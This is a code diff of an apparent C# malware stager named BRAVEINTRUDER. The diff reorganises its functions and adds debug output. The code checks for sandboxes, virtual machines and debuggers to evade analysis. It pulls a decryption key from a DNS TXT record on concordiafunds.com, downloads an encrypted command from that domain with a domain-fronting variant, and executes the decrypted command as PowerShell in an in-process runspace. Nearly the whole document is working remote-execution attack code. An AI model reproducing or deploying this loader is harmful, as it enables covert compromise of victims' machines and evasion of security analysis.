@@ -15,9 +15,9 @@ using System.Text.RegularExpressions;
 
 namespace BRAVEINTRUDER
 {
-    class Program
+    class SandboxCheck
     {
-        static bool checkTimeZone()
+        private static bool checkTimeZone()
         {
             if (TimeZone.CurrentTimeZone.StandardName == "Coordinated Universal Time")
             {
@@ -29,7 +29,7 @@ namespace BRAVEINTRUDER
             }
         }
 
-        static bool checkVMRegistryKeys()
+        private static bool checkVMRegistryKeys()
         {
             List<string> EvidenceOfSandbox = new List<string>();
 
@@ -74,7 +74,7 @@ namespace BRAVEINTRUDER
             return EvidenceOfSandbox.Count == 0;
         }
 
-        static bool checkVMFilePaths()
+        private static bool checkVMFilePaths()
         {
             List<string> EvidenceOfSandbox = new List<string>();
             string[] FilePaths = {@"C:\windows\Sysnative\Drivers\Vmmouse.sys",
@@ -105,17 +105,17 @@ namespace BRAVEINTRUDER
             return EvidenceOfSandbox.Count == 0;
         }
 
-        static bool checkProcessorCount()
+        private static bool checkProcessorCount()
         {
             return System.Environment.ProcessorCount > 1;
         }
 
-        static bool checkDebugger()
+        private static bool checkDebugger()
         {
             return System.Diagnostics.Debugger.IsAttached;
         }
 
-        static bool checkOfficeInstall()
+        private static bool checkOfficeInstall()
         {
             List<string> EvidenceOfOffice = new List<string>();
             string[] FilePaths = {  @"C:\Program Files\Microsoft Office\Office12\excel.exe",
@@ -145,43 +145,54 @@ namespace BRAVEINTRUDER
             return EvidenceOfOffice.Count >= 1;
         }
 
-        static void izSafe()
+        public static void izSafe()
         {
             if (!checkTimeZone())
             {
+                Console.WriteLine("time zone");
                 Environment.Exit(0);
             }
 
             if (!checkProcessorCount())
             {
+                Console.WriteLine("processor");
                 Environment.Exit(0);
             }
 
-            if (!checkDebugger())
+            if (checkDebugger())
             {
-                Environment.Exit(0);
+                Console.WriteLine("debugger");
+                //Environment.Exit(0);
             }
-
-            return;
 
             if (!checkOfficeInstall())
             {
+                Console.WriteLine("office");
                 Environment.Exit(0);
             }
 
             if (!checkVMFilePaths())
             {
+                Console.WriteLine("vm file paths");
                 Environment.Exit(0);
             }
 
+            return;
+
+            //Bug here
             if (!checkVMRegistryKeys())
             {
+                Console.WriteLine("vm registry keys");
                 Environment.Exit(0);
             }
+            
         }
+    }
 
-        //SharpPick
-        static string DoFunStuff(string cmd)
+    //SharpPick
+    class FunStuff
+    {
+        public static string DoFunStuff(string cmd)
         {
             //Init stuff
             Runspace runspace = RunspaceFactory.CreateRunspace();
@@ -205,9 +216,12 @@ namespace BRAVEINTRUDER
             }
             return stringBuilder.ToString().Trim();
         }
+    }
 
+    class HelperFunctions
+    {
         // stolen from https://stackoverflow.com/questions/273452/using-aes-encryption-in-c-sharp
-        static string decrypt(byte[] cipherText, byte[] Key, byte[] IV)
+        public static string decrypt(byte[] cipherText, byte[] Key, byte[] IV)
         {
             // Check arguments. 
             if (cipherText == null || cipherText.Length <= 0)
@@ -250,7 +264,7 @@ namespace BRAVEINTRUDER
         }
 
         // stolen fron http://www.robertsindall.co.uk/blog/blog/2011/05/09/getting-dns-txt-record-using-c-sharp/
-        static IList<string> getTXTrecords(string domain)
+        public static IList<string> getTXTrecords(string domain)
         {
             IList<string> txtRecords = new List<string>();
             string output;
@@ -276,14 +290,12 @@ namespace BRAVEINTRUDER
         }
 
         // stolen from https://stackoverflow.com/questions/27108264/c-sharp-how-to-properly-make-a-http-web-get-request
-        static string HttpGet(string URI)
+        public static string HttpGet(string URI)
         {
             WebClient client = new WebClient();
 
             // Add a user agent header in case the 
             // requested URI contains a query.
-
-            client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
 
             Stream data = client.OpenRead(URI);
             StreamReader reader = new StreamReader(data);
@@ -293,21 +305,38 @@ namespace BRAVEINTRUDER
 
             return s;
         }
+    }
 
+    class Program
+    {
         static void Main()
         {
+            //SandboxCheck.izSafe();
 
-            izSafe();
+            byte[] key = Encoding.ASCII.GetBytes(HelperFunctions.getTXTrecords("ede2db6.concordiafunds.com")[0]);
+            string data; 
+            var version = Environment.Version;
+            if (version.Major >=4) //domain fronting requires .NET 4.0 or higher
+            {
+                Console.WriteLine(".NET 4.0");
+                data = HelperFunctions.HttpGet("https://secured.concordiafunds.com/test-fronting.txt");
+            }
+            else //cant domain front, fetch alternate payload
+            {
+                Console.WriteLine(".NET 3.5");
+                data = HelperFunctions.HttpGet("https://secured.concordiafunds.com/test-nofronting.txt");
+            }
 
-            byte[] key = Encoding.ASCII.GetBytes(getTXTrecords("ede2db6.concordiafunds.com")[0]);
-
-            string data = HttpGet("https://secured.concordiafunds.com/test1.txt");
+            
+            Console.WriteLine(data.Substring(0,10));
             byte[] iv = Convert.FromBase64String(data.Split(':')[0]);
             byte[] encryptedCmd = Convert.FromBase64String(data.Split(':')[1]);
 
-            string cmd = decrypt(encryptedCmd, key, iv);
-
-            DoFunStuff(cmd);
+            string cmd = HelperFunctions.decrypt(encryptedCmd, key, iv);
+            string decodedCmd = System.Text.Encoding.Unicode.GetString(Convert.FromBase64String(cmd));
+            string testCmd = "Invoke-Item C:\\windows\\system32\\calc.exe";
+            Console.WriteLine("proceeded to do fun stuff: {0}", decodedCmd.Substring(0,15));
+            FunStuff.DoFunStuff(decodedCmd);
         }
     }
 }
